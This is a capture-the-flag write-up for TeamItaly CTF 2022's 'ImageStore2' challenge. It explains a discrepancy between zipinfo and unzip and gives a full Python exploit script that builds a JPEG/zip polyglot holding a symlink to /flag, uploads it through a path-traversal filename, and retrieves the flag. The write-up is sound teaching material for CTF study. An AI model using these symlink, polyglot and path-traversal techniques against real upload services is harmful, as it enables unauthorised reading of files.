# TeamItaly CTF 2022

## ImageStore2 (2 solves)

Someone stole my top secret project for a new pasta shape!
I don't know how they did it, so I added all the checks to make sure it doesn't happen again!

I'm sure that now you can't read `/flag`!

This is a remote challenge, you can connect to the service with:

`nc imagestore2.challs.teamitaly.eu 15000`

Tip: to input a line longer than 4095 characters on your terminal, run `stty -icanon; nc imagestore2.challs.teamitaly.eu 15000`.

### Solution

The challenge is almost identical to level 1, and so it is the strategy to solve it.
There are a few differences, though.

Firstly, function 4 now doesn't contain any bugs, at least in the Python code.
Here, the bug is in the different implementation of `zipinfo` and `unzip`, both part of Info-ZIP suite.
The former checks all the file for the EOCD (end-of-central-directory) header, while the latter checks only the last 66000 or so bytes.
So, by appending a long sequence of random characters to a valid empty zip file, we can pass the `zipinfo` check and trick `unzip` into thinking that the same file isn't valid.

Secondly, the file type check in function 1 now requires to provide a valid image.
We have to create a polyglot file, that is both a valid JPEG image, and a zip containing a symlink to `/flag`.
To do that, we can use tools like mitra, or simply by appending our zip file to any valid image.
It's possible to do this because `unzip` allows for "parasite" data at the beginning of the file.

### Exploit

```python
import os
import subprocess
from pwn import *

SMALL_JPEG = b''
SMALL_JPEG += b'\xff\xd8' # SOI
SMALL_JPEG += b'\xff\xe0' # APP0
SMALL_JPEG += b'\x00\x10'
SMALL_JPEG += b'\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00'
SMALL_JPEG += b'\xff\xdb' # DQT
SMALL_JPEG += b'\x00\x43'
SMALL_JPEG += b'\x00'
SMALL_JPEG += b'\x03\x02\x02\x02\x02\x02\x03\x02'
SMALL_JPEG += b'\x02\x02\x03\x03\x03\x03\x04\x06'
SMALL_JPEG += b'\x04\x04\x04\x04\x04\x08\x06\x06'
SMALL_JPEG += b'\x05\x06\x09\x08\x0a\x0a\x09\x08'
SMALL_JPEG += b'\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b'
SMALL_JPEG += b'\x0e\x0b\x09\x09\x0d\x11\x0d\x0e'
SMALL_JPEG += b'\x0f\x10\x10\x11\x10\x0a\x0c\x12'
SMALL_JPEG += b'\x13\x12\x10\x13\x0f\x10\x10\x10'
SMALL_JPEG += b'\xff\xc9' # SOF
SMALL_JPEG += b'\x00\x0b'
SMALL_JPEG += b'\x08\x00\x01\x00\x01\x01\x01\x11\x00'
SMALL_JPEG += b'\xff\xcc' # DAC
SMALL_JPEG += b'\x00\x06\x00\x10\x10\x05'
SMALL_JPEG += b'\xff\xda' # SOS
SMALL_JPEG += b'\x00\x08'
SMALL_JPEG += b'\x01\x01\x00\x00\x3f\x00\xd2\xcf\x20'
SMALL_JPEG += b'\xff\xd9' # EOI

SMALL_ZIP = b'PK\x05\x06' + 18 * b'\x00'

HOST = os.environ.get("HOST", "imagestore2.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15013))

conn = remote(HOST, PORT)

conn.recvuntil(b'> ')
conn.send(b'1\n') # upload an image

initial_path = os.getcwd()
os.chdir('/tmp')

try:
    os.remove('file.zip')
    os.remove('flag')
except:
    pass

subprocess.run(['ln', '-s', '/flag', 'flag'])
subprocess.run(['zip', '--symlinks', 'file.zip', 'flag'])

with open('file.zip', 'rb') as zipfile:
    content = zipfile.read()

os.remove('file.zip')
os.remove('flag')

os.chdir(initial_path)

payload = b64e(SMALL_JPEG + content).encode()

conn.recvuntil(b': ') # image name
conn.send(b'../../tmp/images.zip.zip\n')

conn.recvuntil(b': ') # image/zip polyglot payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'4\n') # upload multiple images

payload = b64e(SMALL_ZIP + 100000 * b'A').encode()

conn.recvuntil(b': ') # zip payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'2\n') # download an image

conn.recvuntil(b'> ')
conn.send(b'0\n') # flag
conn.recvuntil(b'\n')

flag = b64d(conn.recvuntil(b'\n')).decode()

conn.close()

# Print the flag to stdout
print(flag)
```
